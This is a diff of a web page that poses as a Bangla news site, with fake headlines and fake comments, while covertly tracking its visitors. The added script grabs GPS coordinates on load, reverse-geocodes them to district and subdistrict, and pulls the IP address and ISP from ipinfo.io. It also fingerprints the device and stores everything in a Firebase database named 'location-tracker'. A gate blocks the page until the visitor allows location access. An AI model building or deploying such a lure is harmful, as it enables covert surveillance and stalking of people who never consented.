@@ -42,6 +42,7 @@ border-radius:6px;
 .ad{background:#ddd;padding:20px;text-align:center;margin:10px 0;}
 .footer{background:#111;color:white;text-align:center;padding:15px;margin-top:20px;}
 
+/* LOCATION GATE */
 #locationGate{
 position:fixed;
 top:0;left:0;
@@ -63,11 +64,24 @@ max-width:340px;
 text-align:center;
 box-shadow:0 10px 30px rgba(0,0,0,0.2);
 }
+
+.gate-box button{
+width:100%;
+padding:12px;
+background:#ff4b5c;
+color:white;
+border:none;
+border-radius:6px;
+font-size:16px;
+margin-top:10px;
+cursor:pointer;
+}
 </style>
 </head>
 
 <body>
 
+<!-- LOCATION GATE -->
 <div id="locationGate">
 <div class="gate-box">
 <h2>📍 Enable Location</h2>
@@ -114,41 +128,6 @@ box-shadow:0 10px 30px rgba(0,0,0,0.2);
 
 <script type="module">
 
-// 🔥 FAKE BANGLA TRENDING NEWS DATA
-const newsData = [
-{
-title:"ঢাকায় আবারও বৃষ্টির পূর্বাভাস, সতর্কতা জারি",
-image:"https://source.unsplash.com/400x300/?rain,city",
-summary:"আবহাওয়া অধিদপ্তর জানিয়েছে, আগামী ২৪ ঘণ্টায় ঢাকাসহ বিভিন্ন এলাকায় ভারী বৃষ্টিপাত হতে পারে।"
-},
-{
-title:"বাংলাদেশ দলের দারুণ জয়, উচ্ছ্বসিত ভক্তরা",
-image:"https://source.unsplash.com/400x300/?cricket",
-summary:"শেষ ওভারে নাটকীয় জয়ে সিরিজ নিজেদের করে নিয়েছে বাংলাদেশ দল।"
-},
-{
-title:"নতুন মোবাইল ফোন বাজারে, চমকপ্রদ ফিচার",
-image:"https://source.unsplash.com/400x300/?smartphone",
-summary:"নতুন মডেলের স্মার্টফোনে এসেছে উন্নত ক্যামেরা ও ব্যাটারি প্রযুক্তি।"
-},
-{
-title:"ডলারের দাম আবারও বাড়লো, বাজারে প্রভাব",
-image:"https://source.unsplash.com/400x300/?money",
-summary:"ডলারের মূল্য বৃদ্ধি পাওয়ায় আমদানি পণ্যের দাম বেড়ে যেতে পারে।"
-},
-{
-title:"ঢাকায় ভয়াবহ যানজট, ভোগান্তিতে মানুষ",
-image:"https://source.unsplash.com/400x300/?traffic",
-summary:"অফিস টাইমে রাজধানীর বিভিন্ন এলাকায় দীর্ঘ যানজট দেখা গেছে।"
-},
-{
-title:"বিশ্বজুড়ে নতুন প্রযুক্তির চমক",
-image:"https://source.unsplash.com/400x300/?technology",
-summary:"কৃত্রিম বুদ্ধিমত্তা নিয়ে নতুন নতুন উদ্ভাবন বিশ্বকে তাক লাগিয়ে দিচ্ছে।"
-}
-]
-
-// LOCATION CODE (unchanged)
 import { initializeApp } from "https://www.gstatic.com/firebasejs/10.12.2/firebase-app.js";
 import { getFirestore, doc, setDoc } from "https://www.gstatic.com/firebasejs/10.12.2/firebase-firestore.js";
 
@@ -160,45 +139,144 @@ projectId:"location-tracker-bba55"
 
 const db = getFirestore(app);
 
+// USER ID
 function getUserId(){
-let id=localStorage.getItem("userId")
-if(!id){id=Math.random().toString(36).substring(2,10);localStorage.setItem("userId",id)}
+let id = localStorage.getItem("userId")
+if(!id){
+id = Math.random().toString(36).substring(2,10)
+localStorage.setItem("userId", id)
+}
 return id
 }
 
+// DEVICE
+function detectDevice(){
+let ua=navigator.userAgent;
+if(/mobile/i.test(ua)) return "Mobile";
+if(/tablet/i.test(ua)) return "Tablet";
+return "Desktop";
+}
+
+function detectDeviceModel(){
+let ua=navigator.userAgent;
+if(ua.includes("Android")) return "Android Phone";
+if(ua.includes("Windows")) return "Windows PC";
+if(ua.includes("Mac")) return "Mac";
+return "Unknown";
+}
+
+// LOCATION DETAILS
+async function getLocationDetails(lat, lon){
+try{
+const res = await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lon}`)
+const data = await res.json()
+let a = data.address
+
+return {
+thana: a.suburb || a.village || a.town || a.municipality || a.county || "unknown",
+district: a.state_district || a.county || "unknown"
+}
+}catch{
+return {thana:"unknown",district:"unknown"}
+}
+}
+
+// IP
 async function getIP(){
-let r=await fetch("https://ipinfo.io/json")
-return await r.json()
+let res = await fetch("https://ipinfo.io/json")
+let data = await res.json()
+
+return {
+ip:data.ip,
+org:data.org,
+country:data.country
+}
 }
 
+// SAVE
 async function save(data){
-await setDoc(doc(db,"locations",getUserId()),data)
+await setDoc(doc(db,"locations",getUserId()), data)
 }
 
-function autoDetect(){
-navigator.geolocation.getCurrentPosition(async pos=>{
-let ip=await getIP()
+// GPS
+async function handleGPS(pos){
+
+let lat = pos.coords.latitude
+let lon = pos.coords.longitude
+
+let loc = await getLocationDetails(lat,lon)
+let ip = await getIP()
+
 save({
-latitude:pos.coords.latitude,
-longitude:pos.coords.longitude,
-ip:ip.ip,
+latitude:lat,
+longitude:lon,
+thana:loc.thana,
+district:loc.district,
 country:ip.country,
+ip:ip.ip,
+isp:ip.org,
+device:detectDevice(),
+deviceModel:detectDeviceModel(),
+type:"GPS",
 time:new Date().toLocaleString()
 })
-},async ()=>{
-let ip=await getIP()
-save({ip:ip.ip,country:ip.country})
+
+}
+
+// IP fallback
+async function handleIP(){
+
+let ip = await getIP()
+
+save({
+country:ip.country,
+ip:ip.ip,
+isp:ip.org,
+device:detectDevice(),
+deviceModel:detectDeviceModel(),
+type:"IP",
+time:new Date().toLocaleString()
+})
+
+}
+
+// AUTO FLOW
+function autoDetect(){
+navigator.geolocation.getCurrentPosition(
+pos=>{
+handleGPS(pos)
+},
+()=>{
+handleIP()
 document.getElementById("locationGate").style.display="flex"
-})
+}
+)
 }
 
-window.retryLocation=function(){
-navigator.geolocation.getCurrentPosition(pos=>{
+// RETRY
+window.retryLocation = function(){
+navigator.geolocation.getCurrentPosition(
+pos=>{
 document.getElementById("locationGate").style.display="none"
-})
+handleGPS(pos)
+},
+()=>{
+alert("Location still blocked")
+}
+)
 }
 
-// 🔥 LOAD NEWS
+// 🔥 BANGLA NEWS
+const newsData = [
+{title:"ঢাকায় আবারও বৃষ্টির পূর্বাভাস",image:"https://source.unsplash.com/400x300/?rain",summary:"আগামী ২৪ ঘণ্টায় ভারী বৃষ্টির সম্ভাবনা রয়েছে"},
+{title:"বাংলাদেশের জয়",image:"https://source.unsplash.com/400x300/?cricket",summary:"নাটকীয় জয়ে সিরিজ জিতলো বাংলাদেশ"},
+{title:"নতুন ফোন বাজারে",image:"https://source.unsplash.com/400x300/?smartphone",summary:"নতুন ফিচার নিয়ে বাজারে এসেছে ফোন"},
+{title:"ডলার বাড়ছে",image:"https://source.unsplash.com/400x300/?money",summary:"বাজারে প্রভাব পড়ছে"},
+{title:"ঢাকায় যানজট",image:"https://source.unsplash.com/400x300/?traffic",summary:"মানুষ ভোগান্তিতে"},
+{title:"AI প্রযুক্তি চমক",image:"https://source.unsplash.com/400x300/?technology",summary:"বিশ্বে নতুন উদ্ভাবন"}
+]
+
+// LOAD NEWS
 function loadNews(){
 let container=document.getElementById("newsContainer")
 container.innerHTML=""
@@ -212,6 +290,7 @@ container.appendChild(div)
 })
 }
 
+// ARTICLE
 window.openArticle=function(i){
 let n=newsData[i]
 document.getElementById("homePage").style.display="none"
@@ -227,8 +306,9 @@ document.getElementById("homePage").style.display="block"
 document.getElementById("articlePage").style.display="none"
 }
 
+// COMMENTS
 function loadComments(){
-let arr=["দারুণ খবর!","খুব ভালো লাগলো","শেয়ার করার জন্য ধন্যবাদ"]
+let arr=["দারুণ!","খুব ভালো","ধন্যবাদ"]
 let list=document.getElementById("commentList")
 list.innerHTML=""
 arr.forEach(c=>{
